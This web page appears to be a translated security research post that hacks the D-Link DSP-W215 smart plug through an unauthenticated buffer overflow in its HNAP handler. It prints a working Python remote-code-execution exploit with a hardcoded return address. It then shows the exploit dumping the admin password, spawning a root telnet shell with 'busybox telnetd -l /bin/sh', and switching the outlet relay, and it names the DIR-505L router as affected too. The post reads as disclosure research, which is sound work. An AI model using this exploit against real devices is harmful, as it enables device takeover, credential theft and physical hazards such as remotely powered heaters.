<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Hacking the D-Link DSP-W215 Smart Plug</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="D-Link DSP-W215 Smart Plug is a wireless device for monitoring and controlling electrical outlets. It cannot be bought at Amazon or Best Buy stores ye...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Hacking the D-Link DSP-W215 Smart Plug</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/getpro/habr/post_images/3b5/fa3/b38/3b5fa3b3857113642e58e8500e4ef96c.jpg" alt="image"><br>  D-Link DSP-W215 Smart Plug is a wireless device for monitoring and controlling electrical outlets.  It cannot be bought at Amazon or Best Buy stores yet, but the firmware is already available for download on the D-Link website. <br><br>  <b>TL; DR</b> : DSP-W215 contains a buffer overflow error that allows an unauthenticated user to fully control the device, including the outlet itself. <a name="habracut"></a><br><br>  The device firmware is completely standard for embedded systems on Linux: <br><img src="https://habrastorage.org/getpro/habr/post_images/63a/80b/f7e/63a80bf7e26ca5a9e211153a6881dabc.png" alt="image">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      After unpacking the firmware, I discovered that this device does not have a familiar web interface - it can be configured only through a special application for iOS and Android.  And it seems that this application uses the <a href="http://en.wikipedia.org/wiki/Home_Network_Administration_Protocol">Home Network Administration Protocol</a> for communication with the Smart Plug. <br><br>  Since  HNAP is based on the SOAP protocol, it is processed by the lighttpd server, and from an extract of its configuration file, it is easy to understand that the CGI application /www/my_cgi.cgi is handling the HNAP requests: <br><pre><code class="hljs php">... alias.url += ( <span class="hljs-string"><span class="hljs-string">"/HNAP1/"</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"/www/my_cgi.cgi"</span></span>, <span class="hljs-string"><span class="hljs-string">"/HNAP1"</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">"/www/my_cgi.cgi"</span></span>, ...</code> </pre> <br><br>  Although HNAP requires authentication, some actions, namely GetDeviceSettings, do not require it. <br><img src="https://habrastorage.org/getpro/habr/post_images/1bc/f14/a75/1bcf14a7515d4a14acb2535040cc3abe.png" alt="image"><br><br>  GetDeviceSettings can only give a list of possible actions and can not do anything by itself, but this means that my_cgi.cgi parsit the request before checking the authentication. <br><br>  HNAP requests are handled by the do_hnap function in my_cgi.cgi.  Since  HNAP actions are sent as HTTP POST requests, the do_hnap function first processes the Content-Length header: <br><img src="https://habrastorage.org/getpro/habr/post_images/b7c/707/d76/b7c707d76d6cf46ad8d34feab50fb173.png" alt="image"><br><br>  And then, as if nothing had happened, it reads the request body into a fixed-size buffer on the stack: <br><img src="https://habrastorage.org/getpro/habr/post_images/c9e/a2f/e32/c9ea2fe32759a1a63905a5d3d0c4d1c0.png" alt="image"><br><br><pre> <code class="hljs matlab">int content_length, <span class="hljs-built_in"><span class="hljs-built_in">i</span></span>; char *content_length_str; char post_data_buf[<span class="hljs-number"><span class="hljs-number">500000</span></span>]; content_length = <span class="hljs-number"><span class="hljs-number">0</span></span>; content_length_str = getenv(<span class="hljs-string"><span class="hljs-string">"CONTENT_LENGTH"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(content_length_str) { content_length = strtol(content_length_str, <span class="hljs-number"><span class="hljs-number">10</span></span>); } memset(post_data_buf, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">500000</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>(<span class="hljs-built_in"><span class="hljs-built_in">i</span></span>=<span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">i</span></span>&lt;content_length; <span class="hljs-built_in"><span class="hljs-built_in">i</span></span>++) { post_data_buf[<span class="hljs-built_in"><span class="hljs-built_in">i</span></span>] = fgetc(); }</code> </pre> <br><br>  It becomes obvious if you look at memset that the buffer is only for 500000 bytes.  A POST request containing more than 500,000 bytes will overflow the buffer, but since  there are other variables on the stack, it takes 1000020 bytes to overwrite the return address: <br><pre> <code class="hljs swift"># <span class="hljs-type"><span class="hljs-type">Overflow</span></span> $ra with <span class="hljs-number"><span class="hljs-number">0x41414141</span></span> perl -e '<span class="hljs-built_in"><span class="hljs-built_in">print</span></span> <span class="hljs-string"><span class="hljs-string">"D"</span></span>x1000020; <span class="hljs-built_in"><span class="hljs-built_in">print</span></span> <span class="hljs-string"><span class="hljs-string">"A"</span></span>x4' &gt; overflow.txt wget --post-file=overflow.txt http:<span class="hljs-comment"><span class="hljs-comment">//192.168.0.60/HNAP1/</span></span></code> </pre> <br><img src="http://www.devttys0.com/wp-content/uploads/2014/05/ra_control.png" alt="image"><br><br>  But the funniest thing is that the request handler reads the body of the POST request to the buffer in a loop using fgetc, so there are no ‚Äúbad‚Äù bytes - we can pass any bytes to it, even NULL bytes.  It's great because  at address 0x00405CAC, my_cgi.cgi has a code that loads $ a0 (the register of the first argument of the function) with a pointer to the stack ($ sp + 0 √ó 28) and calls system (): <br><img src="http://www.devttys0.com/wp-content/uploads/2014/05/system_rop.png" alt="image"><br><br>  So we just need to rewrite the return address to 0x00405CAC and put the command we need to execute on the stack at offset 0 √ó 28: <br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> urllib2 command = sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>] buf = "D" * <span class="hljs-number"><span class="hljs-number">1000020</span></span> # Fill up the stack buffer buf += "\x00\x40\x5C\xAC" # Overwrite the <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> address <span class="hljs-keyword"><span class="hljs-keyword">on</span></span> the stack buf += "E" * <span class="hljs-number"><span class="hljs-number">0x28</span></span> # Stack filler buf += command # Command <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">execute</span></span> buf += "\x00" # <span class="hljs-keyword"><span class="hljs-keyword">NULL</span></span> terminate the command string req = urllib2.Request("http://192.168.0.60/HNAP1/", buf) print urllib2.urlopen(req).<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>()</code> </pre> <br><br>  Even better than one would expect - the stdout of the command being run returns in response: <br><pre> <code class="hljs ruby">eve@eve<span class="hljs-symbol"><span class="hljs-symbol">:~</span></span>$ ./exploit.py <span class="hljs-string"><span class="hljs-string">'ls -l /'</span></span> drwxr-xr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Jan <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">16</span></span> bin drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">9</span></span> <span class="hljs-number"><span class="hljs-number">16</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">04</span></span> dev drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Sep <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">2010</span></span> etc drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Jan <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">16</span></span> lib drwxr-xr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Jan <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">16</span></span> libexec lrwxrwxrwx <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">11</span></span> May <span class="hljs-number"><span class="hljs-number">9</span></span> <span class="hljs-number"><span class="hljs-number">16</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">01</span></span> linuxrc -&gt; bin/busybox drwxrwxr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Nov <span class="hljs-number"><span class="hljs-number">11</span></span> <span class="hljs-number"><span class="hljs-number">2008</span></span> lost+found drwxrwxr-x <span class="hljs-number"><span class="hljs-number">7</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">9</span></span> <span class="hljs-number"><span class="hljs-number">15</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">44</span></span> mnt drwxr-xr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Jan <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">16</span></span> mydlink drwxrwxr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Nov <span class="hljs-number"><span class="hljs-number">11</span></span> <span class="hljs-number"><span class="hljs-number">2008</span></span> proc drwxrwxr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">9</span></span> <span class="hljs-number"><span class="hljs-number">17</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">49</span></span> root drwxr-xr-x <span class="hljs-number"><span class="hljs-number">2</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Jan <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">16</span></span> sbin drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">15</span></span> <span class="hljs-number"><span class="hljs-number">04</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">27</span></span> tmp drwxrwxr-x <span class="hljs-number"><span class="hljs-number">7</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> Jan <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">16</span></span> usr drwxrwxr-x <span class="hljs-number"><span class="hljs-number">3</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">9</span></span> <span class="hljs-number"><span class="hljs-number">16</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">04</span></span> var -rw-r--r-- <span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">17</span></span> Jan <span class="hljs-number"><span class="hljs-number">14</span></span> <span class="hljs-number"><span class="hljs-number">14</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">16</span></span> version drwxrwxr-x <span class="hljs-number"><span class="hljs-number">8</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">1000</span></span> <span class="hljs-number"><span class="hljs-number">4096</span></span> May <span class="hljs-number"><span class="hljs-number">9</span></span> <span class="hljs-number"><span class="hljs-number">16</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">52</span></span> www</code> </pre> <br><br>  You can dump the admin configuration and password: <br><pre> <code class="hljs pgsql">eve@eve:~$ ./exploit.py <span class="hljs-string"><span class="hljs-string">'nvram show'</span></span> | grep <span class="hljs-keyword"><span class="hljs-keyword">admin</span></span> admin_user_pwd=<span class="hljs-number"><span class="hljs-number">200416</span></span> admin_user_tbl=<span class="hljs-number"><span class="hljs-number">0</span></span>/admin_user_name/admin_user_pwd/admin_level admin_level=<span class="hljs-number"><span class="hljs-number">1</span></span> admin_user_name=<span class="hljs-keyword"><span class="hljs-keyword">admin</span></span> storage_user_00=<span class="hljs-number"><span class="hljs-number">0</span></span>/<span class="hljs-keyword"><span class="hljs-keyword">admin</span></span>//</code> </pre> <br><br>  Or run telnetd and get a full shell. <br><pre> <code class="hljs ruby">eve@eve<span class="hljs-symbol"><span class="hljs-symbol">:~</span></span>$ ./exploit.py <span class="hljs-string"><span class="hljs-string">'busybox telnetd -l /bin/sh'</span></span> eve@eve<span class="hljs-symbol"><span class="hljs-symbol">:~</span></span>$ telnet <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">60</span></span> Trying <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">60</span></span>... Connected to <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">60</span></span>. Escape character is <span class="hljs-string"><span class="hljs-string">'^]'</span></span>. BusyBox v1.<span class="hljs-number"><span class="hljs-number">01</span></span> (<span class="hljs-number"><span class="hljs-number">2014.01</span></span>.<span class="hljs-number"><span class="hljs-number">14</span></span>-<span class="hljs-number"><span class="hljs-number">12</span></span><span class="hljs-symbol"><span class="hljs-symbol">:</span></span><span class="hljs-number"><span class="hljs-number">12</span></span>+<span class="hljs-number"><span class="hljs-number">0000</span></span>) Built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> shell (ash) Enter <span class="hljs-string"><span class="hljs-string">'help'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> a list of built-<span class="hljs-keyword"><span class="hljs-keyword">in</span></span> commands. / <span class="hljs-comment"><span class="hljs-comment">#</span></span></code> </pre> <br><br>  After digging a little deeper into my_cgi.cgi, I discovered that all that is required to turn off or turn on the outlet is to run / var / sbin / relay: <br><pre> <code class="hljs delphi">/<span class="hljs-keyword"><span class="hljs-keyword">var</span></span>/sbin/relay <span class="hljs-number"><span class="hljs-number">1</span></span> # Turns outlet <span class="hljs-keyword"><span class="hljs-keyword">on</span></span> /<span class="hljs-keyword"><span class="hljs-keyword">var</span></span>/sbin/relay <span class="hljs-number"><span class="hljs-number">0</span></span> # Turns outlet off</code> </pre> <br><br>  You can write a small script to blink light: <br><pre> <code class="hljs mel">#!/bin/sh OOK=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> [ <span class="hljs-number"><span class="hljs-number">1</span></span> ] <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> /var/bin/relay $OOK <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> [ $OOK -eq <span class="hljs-number"><span class="hljs-number">1</span></span> ] then OOK=<span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> OOK=<span class="hljs-number"><span class="hljs-number">1</span></span> fi done</code> </pre> <br><br>  Socket management can have more serious consequences, as stated in the D-Link ad: <br><img src="http://www.devttys0.com/wp-content/uploads/2014/05/dlink_iron_ad.png" alt="image"><br>  <i>Deceptive advertising from D-Link</i> <br><br>  Although the Smart Plug itself may be able to detect overheating, I suspect that it only determines overheating itself, since  There is no way to determine the temperature of a device connected to an outlet.  Therefore, if you leave the heater connected to the smart plug, and some vile person will secretly turn it on, you will have a fucking day. <br><br>  It is not clear whether the Smart Plug is trying to make itself accessible from the outside (for example, by forwarding a port through UPnP), or not, because  Android application simply does not work.  I could not even establish an initial connection to the Smart Plug via Android, although it did work through a laptop.  However, in the end, I got a very detailed error when creating an account for remote access to MyDlink: ‚ÄúUnable to create an account‚Äù.  Although at the end of the setup it was said that the Smart Plug was configured to connect to my wireless network, it did not connect to any network, and the access point that was used for the initial configuration was gone.  Since  Wi-Fi is broken, and ethernet is missing, I completely lost contact with the device.  Oh yeah, there is no hard reset button on the device either.  Well, okay, anyway, I was going to throw her out. <br><br>  I suspect that everyone who bought this device could not get it to work, which is probably good in itself.  In any case, I would be afraid to connect such a device to my network or my home appliances. <br><br>  By the way, the <a href="http://www.dlink.com/us/en/home-solutions/connect/routers/dir-505l-shareport-mobile-companion">D-Link DIR-505L router is</a> also subject to this bug, since  has almost exact copy of my_cgi.cgi. <br><br>  PoC for both devices is <a href="http://pastebin.com/GjQgKfgr">here</a> . </div><p>Source: <a href="https://habr.com/ru/post/223313/">https://habr.com/ru/post/223313/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../223301/index.html">[mind map] Specification of a good PMA</a></li>
<li><a href="../223303/index.html">A bold plan that could save the Columbia shuttle. Part 3</a></li>
<li><a href="../223305/index.html">About p2p traffic restrictions</a></li>
<li><a href="../223309/index.html">Samsung Gear App Challenge app competition</a></li>
<li><a href="../223311/index.html">How-to: Stock Market Futures Trading</a></li>
<li><a href="../223315/index.html">Pre-Reform Dictionary: Recipe</a></li>
<li><a href="../223317/index.html">Why the time has come for real browser-based 3D games!</a></li>
<li><a href="../223319/index.html">Chinese government on central TV urged users to upgrade from Windows XP to Linux</a></li>
<li><a href="../223321/index.html">GIS Operator launched on Elbrus platform</a></li>
<li><a href="../223325/index.html">Behavioral factors: How to distinguish a robot from a human?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>